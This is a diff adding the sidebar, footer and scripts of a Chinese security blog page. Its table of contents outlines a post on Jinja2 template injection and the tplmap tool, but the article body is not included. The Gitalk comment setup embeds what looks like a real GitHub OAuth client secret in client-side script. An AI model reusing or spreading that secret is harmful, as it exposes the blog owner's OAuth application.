+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#初步认识"><span class="nav-number">2.</span> <span class="nav-text">初步认识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#模板渲染（重点）"><span class="nav-number">2.1.</span> <span class="nav-text">模板渲染（重点）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的测试"><span class="nav-number">3.</span> <span class="nav-text">简单的测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用-Python-特性在-Jinja2-模板中执行任意代码"><span class="nav-number">4.</span> <span class="nav-text">利用 Python 特性在 Jinja2 模板中执行任意代码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#重点来了"><span class="nav-number">4.1.</span> <span class="nav-text">重点来了</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用tplmap-真的不错"><span class="nav-number">5.</span> <span class="nav-text">用tplmap 真的不错</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'd82772db066079de6512242a9c427508',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
